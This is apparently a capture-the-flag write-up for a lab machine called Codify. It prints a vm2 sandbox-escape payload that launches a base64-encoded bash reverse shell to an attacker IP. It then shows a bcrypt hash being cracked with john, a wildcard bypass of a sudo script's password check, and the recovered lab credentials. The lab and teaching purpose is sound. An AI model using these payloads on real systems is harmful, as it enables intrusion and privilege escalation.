In the editor web we can execute code, but after some tries we found that we cannot execute some modules 

![[Pasted image 20231106125544.png]]

We found a nodejs module called **[vm2](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c)** which will help us to escape the sandbox and run arbitrary code. So we build the following payload

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1' | base64                  
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK
```

```nodejs
const {VM} = require("vm2");
const vm = new VM();
  
const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
   new Error().stack;
   stack();
}
try {
   stack();
} catch (a$tmpname) {
   a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').exec('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK"|base64 -d|bash');
}`

console.log(vm.run(code));
```

And we got a shell

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.239] 44234
bash: cannot set terminal process group (1252): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ whoami
svc
```

Now we need to move. Looking for users we found root (obviously) and joshua. We found the bcrypt hash for joshua in the file `/var/www/contact$ cat tickets.db`

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Codify-10.10.11.239]
└─$ vim josua.hash                                                     

┌──(kali㉿kali)-[~/Documents/Boxes/Codify-10.10.11.239]
└─$ john josua.hash -w=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:31 0.00% (ETA: 2023-11-16 13:41) 0g/s 19.93p/s 19.93c/s 19.93C/s sammy..taurus
spongebob1       (?)     
1g 0:00:01:07 DONE (2023-11-06 14:49) 0.01481g/s 20.00p/s 20.00c/s 20.00C/s crazy1..eunice
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Move laterally to joshua:spongebob1 . Now we can execute as sudo one sh script

```bash
joshua@codify:/var/www/contact$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

joshua@codify:/var/www/contact$ cat /opt/scripts/mysql-backup.sh
!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
/usr/bin/echo "Password confirmed!"
else
/usr/bin/echo "Password confirmation failed!"
exit 1
fi
  
/usr/bin/mkdir -p "$BACKUP_DIR"
  
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do

/usr/bin/echo "Backing up database: $db"
/usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"

done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

It is comparing the pass introduced with the root password, so we can use the wildcard * to bypass the condition and we can check with pspy to see the real password

```bash
joshua@codify:/tmp$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
```

![[Pasted image 20231106152134.png]]

And we got the credentials pkljh12k3jhaskjh12kjh3